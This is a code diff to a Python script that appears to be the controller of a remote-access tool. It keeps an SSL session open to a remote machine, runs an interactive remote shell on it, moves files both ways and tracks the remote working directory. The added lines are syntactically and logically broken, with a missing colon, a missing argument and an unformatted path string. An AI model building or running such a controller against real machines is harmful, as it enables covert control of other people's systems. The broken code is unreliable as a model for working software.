@@ -10,6 +10,7 @@ from signal import SIGTERM
 import tasker
 
 VERBOSE = True
+DEBUG = False
 CURRENT_WORKING_DIR = ""
 
 #IGNORE SSL CHECKS
@@ -121,7 +122,8 @@ def send_data(s, plain_text):
     msg = plain_text + "[END]"
     s.send(msg.encode('utf-8'))
     #s.send(encrypt(msg).encode('utf-8')+b"[END]")
-    print_info("Sent:\n" +plain_text)
+    if DEBUG:
+        print_info("Sent:\n" +plain_text)
 
 def file_transfer_get(conn, command):      #get file from server
     new_cmd = " ".join(command.split()[:2])
@@ -228,11 +230,18 @@ def get_uuid(conn):
     else:
         return uuid
 
-def get_pwd(conn):
+def get_pwd(conn,mode='print'):
     global CURRENT_WORKING_DIR
     send_data(conn, "[pwd]")
     CURRENT_WORKING_DIR = listen_for_data(conn,'store')
-    print_info(CURRENT_WORKING_DIR)
+    if mode == 'print':    
+        print_info(CURRENT_WORKING_DIR)
+    else:
+        pass
+
+def change_working_dir(conn, path):
+    send_data(conn, "[cwd] path")
+    get_pwd(conn,mode='print')
 
 def listen():
     global conn
@@ -380,10 +389,13 @@ def listen():
                     print_good("Found UUID: {}".format(uuid))
                     cmd = ""
                 elif cmd == "7":
-                    get_pwd(conn)
+                    get_pwd(conn,'print')
+                    cmd = ""
                 elif cmd.lower() == "shell":
                     while cmd.lower() == "shell":
-                        command = input("shell > ")
+                        get_pwd(conn,'store')
+                        prompt = CURRENT_WORKING_DIR + ">"
+                        command = input(prompt)
                         forbidden = ['get ', 'get', 'put ', 'put']
                         for item in forbidden:
                             if item in command.split():
@@ -392,13 +404,15 @@ def listen():
                             command = ""
                         elif command == "back" or command == "exit" or command == "quit":
                             cmd = ""
+                        elif command.startswith("cd ")
+                            change_working_dir(command.lstrip("cd "))
                         elif command == "":
                             pass
                         else:
                             data = ""
                             send_data(conn, command)
                             #print_info("Sent:\n"+command)
-                            if VERBOSE:
+                            if DEBUG:
                                 print_info("Waiting for data...")
                             while not data.endswith('[END]'):
                                 recv = conn.recv(128)
@@ -450,7 +464,7 @@ def listen():
         except Exception as e:
             print_fail("SSL Error")
             print(e)
-            print(exc_info)
+            #print(exc_info)
         except ConnectionAbortedError:
             print_warn("Lost Connection")
 
